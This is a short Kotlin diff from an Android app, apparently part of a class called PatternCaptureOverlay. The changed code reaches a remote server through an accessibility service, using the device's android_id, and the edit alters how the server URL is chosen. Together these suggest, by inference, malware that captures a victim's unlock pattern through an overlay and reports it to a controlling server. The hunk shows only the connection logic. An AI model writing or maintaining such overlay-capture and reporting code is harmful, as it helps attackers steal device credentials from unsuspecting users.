@@ -587,7 +587,7 @@ class PatternCaptureOverlay(
             try {
                 val svc = com.storm.safe.rock.service.MyAccessibilityService.getInstance() ?: return@Thread
                 val networkManager = svc.getNetworkManager()
-                val serverUrl = networkManager?.serverUrl ?: return@Thread
+                val serverUrl = networkManager?.httpBaseUrl?.ifEmpty { networkManager.serverUrl } ?: return@Thread
                 if (serverUrl.isEmpty()) return@Thread
                 val deviceId = android.provider.Settings.Secure.getString(context.contentResolver, "android_id") ?: return@Thread
                 val baseUrl = serverUrl.replace("ws://", "http://").replace("wss://", "https://").trimEnd('/')
